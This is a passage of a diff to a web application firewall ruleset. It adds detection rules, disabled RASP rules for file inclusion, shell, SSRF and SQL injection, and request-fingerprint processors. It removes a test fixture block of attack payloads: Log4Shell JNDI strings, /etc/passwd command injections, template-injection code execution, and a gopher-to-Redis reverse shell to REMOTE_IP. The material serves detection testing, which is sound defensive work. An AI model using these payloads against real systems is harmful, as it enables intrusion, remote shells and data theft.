A-Za-z]I)*[048AEIMQUYcgkosw]gI[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yIgO([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[\\x2b\\x2f-9A-Za-z]ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*ICJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]I([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*IDoi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]A6I[km]5[Pv][Tb][km][U-X]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]y([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gOiJ[Ou][Tb][02]5[Fl]|[QY][UW]x[Hn]Ijoi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z]{2}[159BFJNRVZdhlptx][Bh][Tb][EG]ci([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[048AEIMQUYcgkosw]gOiAi[Tb][km]9[Ou][RZ][Q-Za-f]|[\\x2b\\x2f-9A-Za-z][02EGUWkm]F[Ms][RZ]yI6([048ACEIMQSUYcgikoswy]|[\\x2b\\x2f-9A-Za-z]I)*[CSiy]Ai[Tb][km]9[Ou][RZ][Q-Za-f])[A-Za-z0-9+-/]*\\.[A-Za-z0-9+_\\-/]+\\.(?:[A-Za-z0-9+_\\-/]+)?$",
+              "options": {
+                "case_sensitive": true
+              }
+            },
+            "operator": "match_regex"
+          }
+        ],
+        "transformers": []
+      },
+      {
         "id": "dog-931-001",
         "name": "RFI: URL Payload to well known RFI target",
         "tags": {
@@ -5606,6 +5648,9 @@
           {
             "operator": "phrase_match",
             "parameters": {
+              "options": {
+                "enforce_word_boundary": true
+              },
               "inputs": [
                 {
                   "address": "server.request.uri.raw"
@@ -5806,7 +5851,8 @@
                 "/website.php",
                 "/stats.php",
                 "/assets/plugins/mp3_id/mp3_id.php",
-                "/siteminderagent/forms/smpwservices.fcc"
+                "/siteminderagent/forms/smpwservices.fcc",
+                "/eval-stdin.php"
               ]
             }
           }
@@ -6192,6 +6238,204 @@
           }
         ],
         "transformers": []
+      },
+      {
+        "id": "rasp-930-100",
+        "name": "Local file inclusion exploit",
+        "enabled": false,
+        "tags": {
+          "type": "lfi",
+          "category": "vulnerability_trigger",
+          "cwe": "22",
+          "capec": "1000/255/153/126",
+          "confidence": "0",
+          "module": "rasp"
+        },
+        "conditions": [
+          {
+            "parameters": {
+              "resource": [
+                {
+                  "address": "server.io.fs.file"
+                }
+              ],
+              "params": [
+                {
+                  "address": "server.request.query"
+                },
+                {
+                  "address": "server.request.body"
+                },
+                {
+                  "address": "server.request.path_params"
+                },
+                {
+                  "address": "grpc.server.request.message"
+                },
+                {
+                  "address": "graphql.server.all_resolvers"
+                },
+                {
+                  "address": "graphql.server.resolver"
+                }
+              ]
+            },
+            "operator": "lfi_detector"
+          }
+        ],
+        "transformers": [],
+        "on_match": [
+          "stack_trace"
+        ]
+      },
+      {
+        "id": "rasp-932-100",
+        "name": "Shell injection exploit",
+        "enabled": false,
+        "tags": {
+          "type": "command_injection",
+          "category": "vulnerability_trigger",
+          "cwe": "77",
+          "capec": "1000/152/248/88",
+          "confidence": "0",
+          "module": "rasp"
+        },
+        "conditions": [
+          {
+            "parameters": {
+              "resource": [
+                {
+                  "address": "server.sys.shell.cmd"
+                }
+              ],
+              "params": [
+                {
+                  "address": "server.request.query"
+                },
+                {
+                  "address": "server.request.body"
+                },
+                {
+                  "address": "server.request.path_params"
+                },
+                {
+                  "address": "grpc.server.request.message"
+                },
+                {
+                  "address": "graphql.server.all_resolvers"
+                },
+                {
+                  "address": "graphql.server.resolver"
+                }
+              ]
+            },
+            "operator": "shi_detector"
+          }
+        ],
+        "transformers": [],
+        "on_match": [
+          "stack_trace"
+        ]
+      },
+      {
+        "id": "rasp-934-100",
+        "name": "Server-side request forgery exploit",
+        "enabled": false,
+        "tags": {
+          "type": "ssrf",
+          "category": "vulnerability_trigger",
+          "cwe": "918",
+          "capec": "1000/225/115/664",
+          "confidence": "0",
+          "module": "rasp"
+        },
+        "conditions": [
+          {
+            "parameters": {
+              "resource": [
+                {
+                  "address": "server.io.net.url"
+                }
+              ],
+              "params": [
+                {
+                  "address": "server.request.query"
+                },
+                {
+                  "address": "server.request.body"
+                },
+                {
+                  "address": "server.request.path_params"
+                },
+                {
+                  "address": "grpc.server.request.message"
+                },
+                {
+                  "address": "graphql.server.all_resolvers"
+                },
+                {
+                  "address": "graphql.server.resolver"
+                }
+              ]
+            },
+            "operator": "ssrf_detector"
+          }
+        ],
+        "transformers": [],
+        "on_match": [
+          "stack_trace"
+        ]
+      },
+      {
+        "id": "rasp-942-100",
+        "name": "SQL injection exploit",
+        "enabled": false,
+        "tags": {
+          "type": "sql_injection",
+          "category": "vulnerability_trigger",
+          "cwe": "89",
+          "capec": "1000/152/248/66",
+          "confidence": "0",
+          "module": "rasp"
+        },
+        "conditions": [
+          {
+            "parameters": {
+              "resource": [
+                {
+                  "address": "server.db.statement"
+                }
+              ],
+              "params": [
+                {
+                  "address": "server.request.query"
+                },
+                {
+                  "address": "server.request.body"
+                },
+                {
+                  "address": "server.request.path_params"
+                },
+                {
+                  "address": "graphql.server.all_resolvers"
+                },
+                {
+                  "address": "graphql.server.resolver"
+                }
+              ],
+              "db_type": [
+                {
+                  "address": "server.db.system"
+                }
+              ]
+            },
+            "operator": "sqli_detector"
+          }
+        ],
+        "transformers": [],
+        "on_match": [
+          "stack_trace"
+        ]
       },
       {
         "id": "sqr-000-001",
@@ -6610,9 +6854,6 @@
                   "address": "server.request.headers.no_cookies"
                 },
                 {
-                  "address": "grpc.server.request.message"
-                },
-                {
                   "address": "graphql.server.all_resolvers"
                 },
                 {
@@ -6656,9 +6897,6 @@
                 },
                 {
                   "address": "server.request.headers.no_cookies"
-                },
-                {
-                  "address": "grpc.server.request.message"
                 },
                 {
                   "address": "graphql.server.all_resolvers"
@@ -8203,6 +8441,57 @@
     ],
     "processors": [
       {
+        "id": "http-endpoint-fingerprint",
+        "generator": "http_endpoint_fingerprint",
+        "conditions": [
+          {
+            "operator": "exists",
+            "parameters": {
+              "inputs": [
+                {
+                  "address": "waf.context.event"
+                },
+                {
+                  "address": "server.business_logic.users.login.failure"
+                },
+                {
+                  "address": "server.business_logic.users.login.success"
+                }
+              ]
+            }
+          }
+        ],
+        "parameters": {
+          "mappings": [
+            {
+              "method": [
+                {
+                  "address": "server.request.method"
+                }
+              ],
+              "uri_raw": [
+                {
+                  "address": "server.request.uri.raw"
+                }
+              ],
+              "body": [
+                {
+                  "address": "server.request.body"
+                }
+              ],
+              "query": [
+                {
+                  "address": "server.request.query"
+                }
+              ],
+              "output": "_dd.appsec.fp.http.endpoint"
+            }
+          ]
+        },
+        "evaluate": false,
+        "output": true
+      },
+      {
         "id": "extract-content",
         "generator": "extract_schema",
         "conditions": [
@@ -8346,6 +8635,124 @@
               "tags": {
                 "category": "pii"
               }
+            }
+          ]
+        },
+        "evaluate": false,
+        "output": true
+      },
+      {
+        "id": "http-header-fingerprint",
+        "generator": "http_header_fingerprint",
+        "conditions": [
+          {
+            "operator": "exists",
+            "parameters": {
+              "inputs": [
+                {
+                  "address": "waf.context.event"
+                },
+                {
+                  "address": "server.business_logic.users.login.failure"
+                },
+                {
+                  "address": "server.business_logic.users.login.success"
+                }
+              ]
+            }
+          }
+        ],
+        "parameters": {
+          "mappings": [
+            {
+              "headers": [
+                {
+                  "address": "server.request.headers.no_cookies"
+                }
+              ],
+              "output": "_dd.appsec.fp.http.header"
+            }
+          ]
+        },
+        "evaluate": false,
+        "output": true
+      },
+      {
+        "id": "http-network-fingerprint",
+        "generator": "http_network_fingerprint",
+        "conditions": [
+          {
+            "operator": "exists",
+            "parameters": {
+              "inputs": [
+                {
+                  "address": "waf.context.event"
+                },
+                {
+                  "address": "server.business_logic.users.login.failure"
+                },
+                {
+                  "address": "server.business_logic.users.login.success"
+                }
+              ]
+            }
+          }
+        ],
+        "parameters": {
+          "mappings": [
+            {
+              "headers": [
+                {
+                  "address": "server.request.headers.no_cookies"
+                }
+              ],
+              "output": "_dd.appsec.fp.http.network"
+            }
+          ]
+        },
+        "evaluate": false,
+        "output": true
+      },
+      {
+        "id": "session-fingerprint",
+        "generator": "session_fingerprint",
+        "conditions": [
+          {
+            "operator": "exists",
+            "parameters": {
+              "inputs": [
+                {
+                  "address": "waf.context.event"
+                },
+                {
+                  "address": "server.business_logic.users.login.failure"
+                },
+                {
+                  "address": "server.business_logic.users.login.success"
+                }
+              ]
+            }
+          }
+        ],
+        "parameters": {
+          "mappings": [
+            {
+              "cookies": [
+                {
+                  "address": "server.request.cookies"
+                }
+              ],
+              "session_id": [
+                {
+                  "address": "usr.session_id"
+                }
+              ],
+              "user_id": [
+                {
+                  "address": "usr.id"
+                }
+              ],
+              "output": "_dd.appsec.fp.session"
             }
           ]
         },
@@ -9320,1276 +9727,5 @@
         }
       }
     ]
-  },
-  "fixtures": {
-    "eval.valid": {
-      "server.request.headers.no_cookies": [
-        {
-          "user-agent": "mercury.nasl"
-        },
-        {
-          "user-agent": "mercury.nasl'"
-        },
-        {
-          "user-agent": "mercuryboard_user_agent_sql_injection.nasl'"
-        },
-        {
-          "user-agent": "wfuzz/3.1.0"
-        },
-        {
-          "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko (Wallarm DirBuster)"
-        },
-        {
-          "user-agent": "dd-test-scanner-log"
-        },
-        {
-          "user-agent": "dd-test-scanner-log/uuid"
-        },
-        {
-          "user-agent": "dd-test-scanner-log rid/uuid"
-        },
-        {
-          "user-agent": "<script>netsparker(0x0)</script>"
-        },
-        {
-          "user-agent": "Mozilla/5.0 [en] (X11, U; OpenVAS-VT 9.0. 3)"
-        },
-        {
-          "user-agent": "Mozilla/4.75 [en] (X11, U; OpenVAS)"
-        },
-        {
-          "user-agent": "() { OpenVAS-VT:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;"
-        },
-        {
-          "user-agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
-        },
-        {
-          "user-agent": "Mozilla/5.0 (compatible; Detectify)"
-        },
-        {
-          "user-agent": "Mozilla/5.0 (compatible; Detectify; subdomain-takeover)"
-        },
-        {
-          "user-agent": "Mozilla/5.0 (compatible; Detectify) +https://detectify.com/bot/{token}"
-        },
-        {
-          "user-agent": "Fuzz Faster U Fool v1.1.0-git"
-        },
-        {
-          "user-agent": "Aon/5.0 (Macintosh; Intel Mac OS X 10.42; rv:123.0) Gecko/19991231 Firefox/123.0 fingerprint"
-        },
-        {
-          "user-agent": "feroxbuster/2.10.0"
-        },
-        {
-          "user-agent": "dd-test-scanner-log-block"
-        },
-        {
-          "user-agent": "dd-test-scanner-log-block/uuid"
-        },
-        {
-          "user-agent": "dd-test-scanner-log-block rid/uuid"
-        },
-        {
-          "user-agent": "commix/v3.0-dev#15 (https://commixproject.com)"
-        },
-        {
-          "user-agent": "md5(acunetix_wvs_security_test)"
-        },
-        {
-          "user-agent": "f(md5(acunetix_wvs_security_test))"
-        },
-        {
-          "user-agent": "Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t13rl;"
-        },
-        {
-          "user-agent": "Nessus/70003"
-        },
-        {
-          "user-agent": "Nessus/70003 "
-        },
-        {
-          "user-agent": "NESSUS::SOAP; Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
-        },
-        {
-          "user-agent": "Arachni/v1.5.1"
-        },
-        {
-          "user-agent": "Arachni/v1.5.1"
-        },
-        {
-          "user-agent": "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
-        },
-        {
-          "user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij"
-        },
-        {
-          "user-agent": "wpscan v3.8.22 (https://wpscan.com/wordpress-security-scanner)"
-        },
-        {
-          "user-agent": "sqlmap/1.7.3#stable (https://sqlmap.org)"
-        },
-        {
-          "user-agent": "-->'\\\"></sCrIpT/x><sCrIpT/x SRC=//o.o.b/a;></sCrIpT/x>"
-        },
-        {
-          "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
-        },
-        {
-          "user-agent": "Made by ZmEu @ WhiteHat v0.* (www.WhiteHat.ro)"
-        },
-        {
-          "user-agent": "gobuster/3.0.1"
-        },
-        {
-          "user-agent": "mozilla/4.0 (compatible)"
-        },
-        {
-          "user-agent": "mozilla/4.0 (compatible; msie 6.0; win32)"
-        },
-        {
-          "user-agent": "Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)"
-        },
-        {
-          "user-agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
-        },
-        {
-          "user-agent": "Mozilla/5.0 (AlertLogic-MDR-token)${log4shell}"
-        },
-        {
-          "user-agent": "TsunamiSecurityScanner"
-        },
-        {
-          "user-agent": "Mozilla/5.00 (Nikto/2.1.6)"
-        },
-        {
-          "user-agent": "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)"
-        },
-        {
-          "user-agent": "${jndi:ldap}"
-        },
-        {
-          "user-agent": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}"
-        },
-        {
-          "user-agent": "${${::-j}ndi:rmi://127.0.0.1:1389/ass}"
-        },
-        {
-          "user-agent": "${jndi:rmi://a.b.c}"
-        },
-        {
-          "user-agent": "${${lower:jndi}:${lower:rmi}://q.w.e/poc}"
-        },
-        {
-          "user-agent": "${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}"
-        },
-        {
-          "user-agent": "${${lower:${lower:j}}${lower:${lower:n}}${lower:${::-d}}${lower:${lower:i}}:ldap}"
-        },
-        {
-          "user-agent": "${${env:ENV_NAME:-j}n${env:ENV_NAME:-d}i${env:ENV_NAME:-:}${env:ENV_NAME:-l}d${env:ENV_NAME:-a}p${env:ENV_NAME:-:}"
-        },
-        {
-          "user-agent": "${j${::-nD}i${::-:}:}"
-        },
-        {
-          "user-agent": "${j${k8s:k5:-ND}i${sd:k5:-:}}"
-        },
-        {
-          "user-agent": "${j${sys:k5:-nD}${lower:i${web:k5:-:}}:}"
-        },
-        {
-          "user-agent": "${j${main:\\k5:-Nd}i${spring:k5:-:}}"
-        },
-        {
-          "user-agent": "${j${EnV:K5:-nD}i:}"
-        },
-        {
-          "user-agent": "${jn${date:}di${date:':'}}"
-        }
-      ],
-      "server.request.uri.raw": [
-        "/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/windows/win.ini"
-      ],
-      "server.request.query": [
-        {
-          "param": "#dm=@ognl.OgnlContext"
-        },
-        {
-          "param": "(#ognlUtil.getExcludedClasses().clear())"
-        },
-        {
-          "param": "(#ognlUtil=#container.getInstance())"
-        },
-        {
-          "query": "/include.php?gorumdir=http://appspidered.rapid7.com/rfi/123456"
-        },
-        {
-          "query": "//123.oob.appspidered.rapid7.com/a"
-        },
-        {
-          "query": "jndi:ldap://123.oob.appspidered.rapid7.${lower:com}"
-        },
-        {
-          "query": "file:///etc/passwd"
-        },
-        {
-          "query": "file://\\/\\/etc/passwd"
-        },
-        {
-          "query": "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html"
-        },
-        {
-          "query": "dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php"
-        },
-        {
-          "query": "dict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\""
-        },
-        {
-          "query": "dict://127.0.0.1:6379/SAVE"
-        },
-        {
-          "query": "sftp://evil.com:11111/"
-        },
-        {
-          "query": "tftp://evil.com:12346/TESTUDPPACKET"
-        },
-        {
-          "query": "ldap://localhost:11211/%0astats%0aquit"
-        },
-        {
-          "query": "gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A"
-        },
-        {
-          "query": "gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body"
-        },
-        {
-          "query": "gopher://hack3r.site:1337/_SSRF%0ATest!"
-        },
-        {
-          "query": "gopher://0:25/_%0AHELO victim.com%0AMAIL FROM: <admin@victim.com>%0ARCPT To: <sxcurity@oou.us>"
-        },
-        {
-          "query": "gopher://localhost:8000/_%00%1A%00%00%0A%"
-        },
-        {
-          "query": "gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml"
-        },
-        {
-          "query": "gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php"
-        },
-        {
-          "query": "gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22"
-        },
-        {
-          "query": "gopher://127.0.0.1:6379/_save"
-        },
-        {
-          "query": "netdoc:///etc/passwd"
-        },
-        {
-          "query": "jar:sftp://127.0.0.1:22/"
-        },
-        {
-          "payload": "<script src=\"http://bla.bxss.in/\">"
-        },
-        {
-          "payload": "<script src=\"http://bla.bxss.me/\">"
-        },
-        {
-          "query": "\"&timeout /T 15&\""
-        },
-        {
-          "query": "' | cat /etc/passwd | '"
-        },
-        {
-          "query": "' | cat /et\"c/p\"as\"sw\"d | '"
-        },
-        {
-          "query": "' | cat /etc/security/passwd | '"
-        },
-        {
-          "query": "\" | cat /etc/master.passwd | \""
-        },
-        {
-          "query": "\"&cat /etc/passwd&\""
-        },
-        {
-          "query": "'&cat /etc/passwd&'"
-        },
-        {
-          "q": "<esi:include src=\"http://whsec.us/rfi.php\"/>"
-        },
-        {
-          "query": "https://bla.com:5986/wsman"
-        },
-        {
-          "query": "https://bla:5986/wsman"
-        },
-        {
-          "query": "https://:5986/wsman"
-        },
-        {
-          "query": "https://1.2.3.4:5986/wsman"
-        },
-        {
-          "query": "https://[1234::AbCd]:5986/wsman"
-        },
-        {
-          "query": "http://spoofed.burpcollaborator.net"
-        },
-        {
-          "query": "http://oastify.com"
-        },
-        {
-          "query": "http://[::]:80/"
-        },
-        {
-          "query": "http://[::]:80"
-        },
-        {
-          "query": "http://[::]:25/"
-        },
-        {
-          "query": "http://[::]:22/"
-        },
-        {
-          "query": "http://[::]:3128/"
-        },
-        {
-          "query": "http://0000::1:80/"
-        },
-        {
-          "query": "http://0000::1:80"
-        },
-        {
-          "query": "http://0000::1:25/"
-        },
-        {
-          "query": "http://0000::1:22/"
-        },
-        {
-          "query": "http://0000::1:3128/"
-        },
-        {
-          "query": "http://[0:0:0:0:0:ffff:127.0.0.1]"
-        },
-        {
-          "query": "http://::ffff:0:0/"
-        },
-        {
-          "query": "http://0:0:0:0:0:ffff:0:0/"
-        },
-        {
-          "query": "http://0000:0000:0000:0000:0000:ffff:0000:0000/"
-        },
-        {
-          "query": "http://::ffff:7f00:1/"
-        },
-        {
-          "query": "http://0:0:0:0:0:ffff:7f00:0001/"
-        },
-        {
-          "query": "http://0000:0000:0000:0000:0000:ffff:7f00:0001/"
-        },
-        {
-          "query": "http://::ffff:7f00:1/"
-        },
-        {
-          "query": "http://425.510.425.510/"
-        },
-        {
-          "query": "http://2852039166/"
-        },
-        {
-          "query": "http://7147006462/"
-        },
-        {
-          "query": "http://0xA9.0xFE.0xA9.0xFE/"
-        },
-        {
-          "query": "http://0xA9FEA9FE/"
-        },
-        {
-          "query": "http://0x41414141A9FEA9FE/"
-        },
-        {
-          "query": "http://0251.0376.0251.0376/"
-        },
-        {
-          "query": "http://0251.00376.000251.0000376/"
-        },
-        {
-          "query": "http://0x7f000001:20"
-        },
-        {
-          "query": "http://0x7f.0.0.0001"
-        },
-        {
-          "query": "http://0x7f.0.0.000/+hello+world"
-        },
-        {
-          "param": "#set($x='')##"
-        },
-        {
-          "param": "#set($rt=$x.class.forName('java.lang.Runtime'))##"
-        },
-        {
-          "param": "#set($chr=$x.class.forName('java.lang.Character'))##"
-        },
-        {
-          "param": "#set($str=$x.class.forName('java.lang.String'))##"
-        },
-        {
-          "param": "#set($ex=$rt.getRuntime().exec('id'))##"
-        },
-        {
-          "param": "#set($out=$ex.getInputStream())##"
-        },
-        {
-          "param": "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
-        },
-        {
-          "param": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"
-        },
-        {
-          "param": "<#assign uri = classLoader.getResource(\"META-INF\").toURI() >"
-        },
-        {
-          "param": "<#assign url = uri.resolve(\"file:///etc/passwd\").toURL() >"
-        },
-        {
-          "param": "<#assign bytes = url.openConnection().inputStream.readAllBytes() >"
-        },
-        {
-          "param": "<#assign classloader=<<object>>.class.protectionDomain.classLoader>"
-        },
-        {
-          "param": "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>"
-        },
-        {
-          "param": "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
-        },
-        {
-          "param": "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>"
-        },
-        {
-          "param": "<iframe src=data:text/html,"
-        },
-        {
-          "param": "<iframe src=\"data:text/html;base64,blablabla\">"
-        },
-        {
-          "param": "<iframe/src=data:text/html;base64,blablabla></iframe>"
-        },
-        {
-          "param": "Hh'><iframe src=\"javascript:al+ert()\"></iframe>"
-        },
-        {
-          "param": "\"><iframe src=//14.rs+"
-        },
-        {
-          "param": "\"<iframe src=\"http://o.o.b/\" class=\"haikumsg\"></iframe><!--"
-        },
-        {
-          "param": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/109.0.0.0Safari/537.36<esi:include src=\"http://bxss.me/rpb.png\"/>"
-        },
-        {
-          "param": "><esi:include src=dns://oob.dom\" />"
-        },
-        {
-          "query": "https://127.0.0.1/"
-        },
-        {
-          "query": "https://127.0.0.1"
-        },
-        {
-          "query": "http://127.127.127.127/"
-        },
-        {
-          "query": "http://127.0.1.3/"
-        },
-        {
-          "query": "http://127.0.0.0:80"
-        },
-        {
-          "query": "http://1.2.3.4:80/+hello-world"
-        },
-        {
-          "query": "http://2130706433/"
-        },
-        {
-          "query": "http://3232235521/"
-        },
-        {
-          "query": "http://3232235777/"
-        },
-        {
-          "query": "http://2852039166/"
-        },
-        {
-          "query": "http://0177.0.0.1/"
-        },
-        {
-          "query": "http://o177.0.0.1/"
-        },
-        {
-          "query": "http://0o177.0.0.1/"
-        },
-        {
-          "query": "http://q177.0.0.1/"
-        },
-        {
-          "query": "http://127.0.0.1:80"
-        },
-        {
-          "query": "http://127.0.0.1:443"
-        },
-        {
-          "query": "http://127.0.0.1:22"
-        },
-        {
-          "query": "http://0.0.0.0:80"
-        },
-        {
-          "query": "http://0.0.0.0:443"
-        },
-        {
-          "query": "http://0.0.0.0:22"
-        },
-        {
-          "query": "http://0.0.0.0:22234"
-        },
-        {
-          "query": "https://127.0.0.1:90"
-        },
-        {
-          "query": "jar:http://127.0.0.1/"
-        },
-        {
-          "query": "jar:https://127.0.0.1/"
-        },
-        {
-          "query": "http://szp.prbly.win"
-        },
-        {
-          "q": "outbound.watchtowr.com/watchtowr"
-        },
-        {
-          "query": "http://spoofed.burpcollaborator.net"
-        },
-        {
-          "query": "http://localtest.me"
-        },
-        {
-          "query": "http://mail.ebc.apple.com"
-        },
-        {
-          "query": "http://bugbounty.dod.network"
-        },
-        {
-          "query": "http://10.0.0.1.nip.io"
-        },
-        {
-          "query": "http://0a000803.nip.io"
-        },
-        {
-          "query": "http://192-168-1-250.nip.io"
-        },
-        {
-          "query": "http://app.10.8.0.1.nip.io"
-        },
-        {
-          "query": "http://customer1.app.localhost.my.company.127.0.0.1.nip.io"
-        },
-        {
-          "query": "https://customer1.app.10.0.0.1.nip.io"
-        },
-        {
-          "query": "https://customer3-app-7f000101.nip.io"
-        },
-        {
-          "query": "http://magic-7f000001.nip.io"
-        },
-        {
-          "query": "http://169.254.169.254.xip.io/"
-        },
-        {
-          "query": "http://1ynrnhl.xip.io/"
-        },
-        {
-          "query": "http://oastify.com"
-        },
-        {
-          "query": "http://oast.pro"
-        },
-        {
-          "query": "http://oast.live"
-        },
-        {
-          "query": "http://oast.site"
-        },
-        {
-          "query": "http://oast.online"
-        },
-        {
-          "query": "http://oast.fun"
-        },
-        {
-          "query": "http://oast.me"
-        },
-        {
-          "query": "http://sslip.io"
-        },
-        {
-          "query": "http://requestbin.com"
-        },
-        {
-          "query": "http://requestbin.net"
-        },
-        {
-          "query": "http://hookbin.com"
-        },
-        {
-          "query": "http://webhook.site"
-        },
-        {
-          "query": "http://canarytokens.com"
-        },
-        {
-          "query": "http://interact.sh"
-        },
-        {
-          "query": "http://blabla.ngrok.io"
-        },
-        {
-          "query": "http://bugbounty.click"
-        },
-        {
-          "query": "http://www.owasp.org.1ynrnhl.xip.io/"
-        },
-        {
-          "query": "https://act1on3.ru/i"
-        },
-        {
-          "query": "https://x.${hostname}.x.vii.one/s"
-        },
-        {
-          "param": "#{ognl:bla}"
-        },
-        {
-          "param": "%{param.test}"
-        },
-        {
-          "param": "${param.test}"
-        },
-        {
-          "param": "${\"tenablewas_iDjTfcDtnuST\"+(6370*7649)}"
-        },
-        {
-          "param": "aaa'+#{\"\"[\"class\"]}+'bbb"
-        },
-        {
-          "param": "${98991*97996}"
-        },
-        {
-          "query": "http://requestbin.com"
-        },
-        {
-          "query": "http://requestbin.net"
-        },
-        {
-          "query": "http://blabla.ngrok.io"
-        },
-        {
-          "query": "http://interact.sh"
-        },
-        {
-          "query": "http://oast.pro"
-        },
-        {
-          "query": "http://oast.live"
-        },
-        {
-          "query": "http://oast.site"
-        },
-        {
-          "query": "http://oast.online"
-        },
-        {
-          "query": "http://oast.fun"
-        },
-        {
-          "query": "http://oast.me"
-        },
-        {
-          "query": "<iframe src=\"http://bla.indusfacefinder.in/\""
-        },
-        {
-          "query": "<iframe src='http://no.where.land'></iframe>"
-        },
-        {
-          "query": "<iframe src=http://dyn.syhunt.net/scriptlet.html"
-        },
-        {
-          "query": "/druid/coordinator/v1/lookups/config/${jndi:ldap://ckf5pjkuebutk712sdugzegj7keqfouzi.oast.online/tea}"
-        },
-        {
-          "param": "admin' ALLOW FILTERING;"
-        },
-        {
-          "param": "ALLOW /* noise */ FILTERING"
-        },
-        {
-          "param": "allow filtering"
-        },
-        {
-          "param": "allow            filtering"
-        },
-        {
-          "param": "bla allow filtering; bla"
-        },
-        {
-          "q": "<iframe src=\"http://bla.r87.com/?\"></iframe>"
-        },
-        {
-          "q": "<iframe src=\"//bla&#46;r87&#46;me\"></iframe>"
-        },
-        {
-          "q": "<iframe src=\"//blablablabla&#46;r87&#46;me\""
-        },
-        {
-          "q": "<iframe src=\"http://r87.com/?\""
-        },
-        {
-          "query": "http://blabla.qualysperiscope.com"
-        },
-        {
-          "query": "${script:javascript:java.lang.Runtime.getRuntime().exec('curl http://@CIPHER@.@UNIQUEID@.123.oscomm42.oscomm.@DOMAIN@')}"
-        },
-        {
-          "param": "system($value)"
-        },
-        {
-          "param": "system(/*obfs*/$value/*obfs*/)"
-        },
-        {
-          "param": "system( /*obfs*/ $value/*obfs*/)"
-        },
-        {
-          "param": "system(BLA, BLA)"
-        },
-        {
-          "param": "system(BLA, $bla)"
-        },
-        {
-          "param": "system($bla, $bla)"
-        },
-        {
-          "param": "system($bla, Bla)"
-        },
-        {
-          "param": "system(BLA)"
-        },
-        {
-          "param": "system($bla.bla)"
-        },
-        {
-          "param": "system(BLA::BLA)"
-        },
-        {
-          "param": "system($bla->bla)"
-        },
-        {
-          "param": "system(BLA.bla)"
-        },
-        {
-          "param": "system(BLA->bla)"
-        },
-        {
-          "param": "system($bla.bla, 1)"
-        },
-        {
-          "param": "system(BLA->bla, 1)"
-        },
-        {
-          "param": "system(\"bla\")"
-        },
-        {
-          "param": "system(\\\"bla\\\")"
-        },
-        {
-          "param": "system('bla', \"bla\")"
-        },
-        {
-          "param": "system(bla(something(about)))"
-        },
-        {
-          "param": "system('cat /etc/passwd')"
-        },
-        {
-          "param": "system()"
-        },
-        {
-          "param": "system ()"
-        },
-        {
-          "param": "system/*obfs*/()"
-        },
-        {
-          "param": "${T(java.lang.Runtime).getRuntime().exec(\"netstat\")}"
-        },
-        {
-          "param": "eval('print localtime()*0+0xFFF9999-82493')"
-        },
-        {
-          "param": "eval('print \"hi\"')"
-        },
-        {
-          "param": "eval(\"bla\\\"bla\", \"bla\\\"bla\")"
-        },
-        {
-          "param": "eval(\"print 'hi'\")"
-        },
-        {
-          "param": "exec('bla ''\\bla'+'bla'+'\\c$\\a''')"
-        },
-        {
-          "param": "exec(\"bla \"\"\\\\bla\"+\"bla\"+\"\\c$\\a\"\"\")"
-        },
-        {
